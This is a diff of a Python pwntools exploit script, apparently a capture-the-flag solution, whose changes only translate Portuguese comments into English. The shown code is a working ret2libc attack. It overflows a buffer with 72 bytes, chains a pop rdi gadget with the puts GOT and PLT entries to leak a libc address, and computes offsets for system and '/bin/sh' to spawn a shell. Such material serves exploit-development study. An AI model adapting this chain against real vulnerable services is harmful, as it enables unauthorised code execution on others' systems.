@@ -10,7 +10,7 @@ p.info("Leak libc address")
 got_puts = p64(0x601018) # Global offset table puts address
 plt_puts = p64(0x4004e0) # Procedure Linkage Table puts address
 plt_main = p64(0x400626) # — — — — — — — — — — — — main address
-pop_rdi = p64(0x4006d3) # valor da função pop rdi
+pop_rdi = p64(0x4006d3) # pop function value rdi
 overflow = 'A'*72
 payload = overflow + pop_rdi + got_puts + plt_puts + plt_main
 p.recvuntil('dah?\n')
@@ -18,7 +18,7 @@ p.sendline(payload)
 leaked_puts = u64(p.recvuntil('\n').strip().ljust(8, '\x00'))
 log.success("Leaked puts@GLIBC: 0x{:x}".format(leaked_puts))
 p.info("Payload time")
-libc_put = 0x06f690 # valores dos offsets das funções, encontrados via pesquisa.
+libc_put = 0x06f690 # values ​​of function offset, found via search.
 libc_sys = 0x045390
 libc_sh = 0x18cd17
 offset = leaked_puts - libc_put
